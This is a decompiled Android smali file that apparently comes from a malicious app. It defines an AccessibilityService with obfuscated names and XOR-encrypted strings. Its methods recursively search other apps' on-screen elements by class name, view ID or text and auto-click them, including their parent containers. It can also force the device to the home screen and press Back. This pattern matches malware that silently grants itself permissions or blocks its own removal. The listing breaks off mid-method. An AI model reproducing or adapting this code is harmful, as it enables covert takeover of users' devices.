.class public Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;
.super Landroid/accessibilityservice/AccessibilityService;


# static fields
.field public static a:Z

.field static b:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static c:Z

.field private static final d:[Ljava/lang/String;

.field public static e:I

.field static g:I


# instance fields
.field f:Z


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0x1d

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "5\u000c\u0014>k=\u0006^;m0\u0005\u00158*\u0017\n\u0015/o\u0016\r\u0008"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/4 v9, 0x4

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "5\u000c\u0014>k=\u0006^;m0\u0005\u00158*\u0016\u0017\u00048k:"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "\u0000; \t[\u0002+5\u001b[\u0000\'(\u0018[\u0017*1\u0002C\u0011&"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "\u0000; \t[\u0003+>\u0008K\u0003=#\u0018E\u0000\'/\u000fL\u0015,7\t@"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "\u0000; \t[\u0002+5\u001b[\u0017.9\u000fO\u0011&"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "\u0000; \t[\u0002+5\u001b[\u0018->\u000b[\u0017.9\u000fO\u0011&"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "\u0000; \t[\u001a-$\u0005B\u001d!1\u0018M\u001b,/\u001fP\u001565\u0013G\u001c#>\u000bA\u0010"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "\u0000; \t[\u0002+5\u001b[\u0007\'<\tG\u0000\'4"

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    const/16 v2, 0x8

    const-string v1, "\u0000; \t[\u0002+5\u001b[\u0012-3\u0019W\u0011&"

    const/4 v0, 0x7

    move-object v3, v4

    goto :goto_0

    :pswitch_7
    aput-object v1, v3, v2

    const/16 v2, 0x9

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0000-g?\u0003\u0017)m:\u0011\u0004-h8\u0007\u0002bQ:\u000b\u001e?p5\u000e\u001c)v\u0015\u0001\u0004%r=\u0016\t"

    const/16 v0, 0x8

    move-object v3, v4

    goto :goto_0

    :pswitch_8
    aput-object v1, v3, v2

    const/16 v2, 0xa

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0000$k:\u0007^\u0001k6\u000b\u001c)J1\u0016\u0007#v?1\u00158p=\u000c\u0017?"

    const/16 v0, 0x9

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_9
    aput-object v1, v3, v2

    const/16 v2, 0xb

    const-string v1, "5\u000c\u0014>k=\u0006^;m0\u0005\u00158*\u0012\u0010\u0011!a\u0018\u0003\t#q "

    const/16 v0, 0xa

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_a
    aput-object v1, v3, v2

    const/16 v2, 0xc

    const-string v1, "5\u000c\u0014>k=\u0006^%j \u0007\u001e8*5\u0001\u0004%k:L=\rM\u001a"

    const/16 v0, 0xb

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_b
    aput-object v1, v3, v2

    const/16 v2, 0xd

    const-string v1, "q\u0011"

    const/16 v0, 0xc

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_c
    aput-object v1, v3, v2

    const/16 v2, 0xe

    const-string v1, "\u0000; \t[\u0003+>\u0008K\u0003=#\u0018E\u0000\'/\u000fL\u0015,7\t@"

    const/16 v0, 0xd

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_d
    aput-object v1, v3, v2

    const/16 v2, 0xf

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0003)p \u000b\u001e+wn\u000b\u0014cg5\u000c\u0013)h\u000b\u0000\u00058p;\u000c"

    const/16 v0, 0xe

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_e
    aput-object v1, v3, v2

    const/16 v2, 0x10

    const-string v1, "q\u0011"

    const/16 v0, 0xf

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_f
    aput-object v1, v3, v2

    const/16 v2, 0x11

    const-string v1, "5\u000c\u0014>k=\u0006^%j \u0007\u001e8*7\u0003\u0004)c;\u0010\tbL\u001b/5"

    const/16 v0, 0x10

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_10
    aput-object v1, v3, v2

    const/16 v2, 0x12

    const-string v1, "5\u000c\u0014>k=\u0006J%`{\u0000\u00058p;\u000cA"

    const/16 v0, 0x11

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_11
    aput-object v1, v3, v2

    const/16 v2, 0x13

    const-string v1, "q\u0011"

    const/16 v0, 0x12

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_12
    aput-object v1, v3, v2

    const/16 v2, 0x14

    const-string v1, "5\u000c\u0014>k=\u0006^\u000eK\u001b6/\u000fK\u00192<\tP\u0011&"

    const/16 v0, 0x13

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_13
    aput-object v1, v3, v2

    const/16 v2, 0x15

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0019\"p1\u0010\u001e-hz\u0003\u0000<*\u0006\u0007\u0003#h\"\u0007\u0002\rg \u000b\u0006%p-"

    const/16 v0, 0x14

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_14
    aput-object v1, v3, v2

    const/16 v2, 0x16

    const-string v1, "5\u000c\u0014>k=\u0006J%`{\u0000\u00058p;\u000c/-h#\u0003\t?"

    const/16 v0, 0x15

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_15
    aput-object v1, v3, v2

    const/16 v2, 0x17

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0003)p \u000b\u001e+wz&\u0015:m7\u00071(i=\u000c1(`"

    const/16 v0, 0x16

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_16
    aput-object v1, v3, v2

    const/16 v2, 0x18

    const-string v1, "$\u0003\u0013\'e3\u0007\u0019\"w \u0003\u001c a&"

    const/16 v0, 0x17

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_17
    aput-object v1, v3, v2

    const/16 v2, 0x19

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0003)p \u000b\u001e+wn\u000b\u0014ce7\u0016\u0019#j\u000b\u0000\u00058p;\u000c"

    const/16 v0, 0x18

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_18
    aput-object v1, v3, v2

    const/16 v2, 0x1a

    const-string v1, "0\u0007\u0006%g1=\u0000#h=\u0001\t"

    const/16 v0, 0x19

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_19
    aput-object v1, v3, v2

    const/16 v2, 0x1b

    const-string v1, "5\u000c\u0014>k=\u0006J%`{\u0000\u00058p;\u000cA"

    const/16 v0, 0x1a

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1a
    aput-object v1, v3, v2

    const/16 v2, 0x1c

    const-string v1, "7\r\u001dbe:\u0006\u0002#m0L\u0019\"p1\u0010\u001e-hz\u0012\u001f m7\u001b^%i$\u000e^\u001cl;\u000c\u0015\u001bm:\u0006\u001f;"

    const/16 v0, 0x1b

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_1b
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v0, 0x0

    sput v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    const/4 v0, 0x0

    sput-boolean v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->c:Z

    const/4 v0, 0x0

    sput-boolean v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a:Z

    const/4 v0, 0x0

    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->b:Landroid/view/accessibility/AccessibilityNodeInfo;

    return-void

    :pswitch_1c
    const/16 v9, 0x54

    goto/16 :goto_2

    :pswitch_1d
    const/16 v9, 0x62

    goto/16 :goto_2

    :pswitch_1e
    const/16 v9, 0x70

    goto/16 :goto_2

    :pswitch_1f
    const/16 v9, 0x4c

    goto/16 :goto_2

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1c
        :pswitch_1d
        :pswitch_1e
        :pswitch_1f
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
        :pswitch_b
        :pswitch_c
        :pswitch_d
        :pswitch_e
        :pswitch_f
        :pswitch_10
        :pswitch_11
        :pswitch_12
        :pswitch_13
        :pswitch_14
        :pswitch_15
        :pswitch_16
        :pswitch_17
        :pswitch_18
        :pswitch_19
        :pswitch_1a
        :pswitch_1b
    .end packed-switch
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->f:Z

    return-void
.end method

.method public static a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    if-nez p0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    :try_start_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v2, 0x1

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    if-eqz v0, :cond_3

    :try_start_1
    sget v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    if-ne v0, p2, :cond_2

    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_2
    :try_start_2
    sget v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    add-int/lit8 v0, v0, 0x1

    sput v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    :cond_3
    const/4 v0, 0x0

    :goto_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p1, 0x1

    invoke-static {v1, v2, p2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_3
    throw v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    move-exception v0

    :try_start_4
    throw v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    move-exception v0

    goto :goto_0
.end method

.method public static a(Landroid/view/accessibility/AccessibilityNodeInfo;ILandroid/content/Context;)V
    .locals 5
    .annotation build Landroid/annotation/TargetApi;
        value = 0x12
    .end annotation

    const/4 v0, 0x0

    if-nez p0, :cond_1

    :cond_0
    return-void

    :cond_1
    :try_start_0
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->b:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v1, :cond_2

    sput-object p0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->b:Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    const v1, 0x7f070002

    invoke-virtual {p2, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    :try_start_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v4, 0x0

    aget-object v3, v3, v4

    invoke-virtual {v2, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    const/16 v2, 0x10

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :cond_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_4

    :try_start_2
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x13

    if-lt v1, v2, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/16 v2, 0x10

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/16 v2, 0x10

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/16 v2, 0x10

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :cond_4
    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p1, 0x1

    invoke-static {v1, v2, p2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;ILandroid/content/Context;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    throw v0

    :catch_1
    move-exception v0

    throw v0

    :cond_5
    :try_start_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/16 v2, 0x10

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/4 v1, 0x0

    sput v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->g:I

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->b:Landroid/view/accessibility/AccessibilityNodeInfo;

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_0

    :catch_2
    move-exception v1

    goto :goto_0
.end method

.method public static a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    .locals 5
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    const/4 v1, 0x0

    sget-boolean v3, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    if-nez p0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    move v2, v1

    move v0, v1

    :cond_2
    :try_start_0
    array-length v4, p2

    if-ge v2, v4, :cond_3

    aget-object v0, p2, v2

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const/4 v4, 0x0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v4, 0x10

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    add-int/lit8 v2, v2, 0x1

    const/4 v0, 0x1

    if-eqz v3, :cond_2

    :goto_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p1, 0x1

    invoke-static {v1, v2, p2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_3
    if-nez v0, :cond_0

    move v0, v1

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public static a(Z)V
    .locals 0

    sput-boolean p0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a:Z

    return-void
.end method

.method private b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 2

    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    sparse-switch v0, :sswitch_data_0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    throw v0

    :sswitch_0
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v1, 0x6

    aget-object v0, v0, v1

    goto :goto_0

    :sswitch_1
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v1, 0x4

    aget-object v0, v0, v1

    goto :goto_0

    :sswitch_2
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v1, 0x8

    aget-object v0, v0, v1

    goto :goto_0

    :sswitch_3
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v1, 0x5

    aget-object v0, v0, v1

    goto :goto_0

    :sswitch_4
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v1, 0x7

    aget-object v0, v0, v1

    goto :goto_0

    :sswitch_5
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v1, 0x3

    aget-object v0, v0, v1

    goto :goto_0

    :sswitch_6
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/4 v1, 0x2

    aget-object v0, v0, v1

    goto :goto_0

    nop

    :sswitch_data_0
    .sparse-switch
        0x1 -> :sswitch_1
        0x2 -> :sswitch_3
        0x4 -> :sswitch_4
        0x8 -> :sswitch_2
        0x10 -> :sswitch_6
        0x20 -> :sswitch_5
        0x40 -> :sswitch_0
    .end sparse-switch
.end method

.method public static b(Z)V
    .locals 0

    sput-boolean p0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->c:Z

    return-void
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 11
    .annotation build Landroid/annotation/TargetApi;
        value = 0x13
    .end annotation

    sget-boolean v2, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    const/4 v0, 0x0

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/z;

    invoke-direct {v1}, Lzvy/zpfypq/bbuhtkwvaf/z;-><init>()V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;

    invoke-virtual {v1, v3, v4}, Lzvy/zpfypq/bbuhtkwvaf/z;->a(Landroid/content/Context;Ljava/lang/Class;)V

    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->f:Z

    if-nez v1, :cond_0

    const/4 v1, 0x1

    iput-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->f:Z

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/c;

    invoke-direct {v1, p0}, Lzvy/zpfypq/bbuhtkwvaf/c;-><init>(Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;)V

    new-instance v3, Landroid/content/IntentFilter;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v5, 0x14

    aget-object v4, v4, v5

    invoke-direct {v3, v4}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v1, v3}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    :cond_0
    :try_start_0
    sget-boolean v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->c:Z

    if-eqz v1, :cond_1

    sget-boolean v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_1

    :try_start_1
    new-instance v1, Landroid/content/Intent;

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v4, 0xc

    aget-object v3, v3, v4

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v4, 0x11

    aget-object v3, v3, v4

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v1}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->startActivity(Landroid/content/Intent;)V

    const/4 v1, 0x1

    invoke-virtual {p0, v1}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->performGlobalAction(I)Z

    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_2

    :goto_0
    return-void

    :catch_0
    move-exception v0

    throw v0

    :catch_1
    move-exception v0

    goto :goto_0

    :cond_2
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->d:[Ljava/lang/String;

    const/16 v3, 0x13

    aget-object v1, v1, v3

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    invoke-direct {p0, p1}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

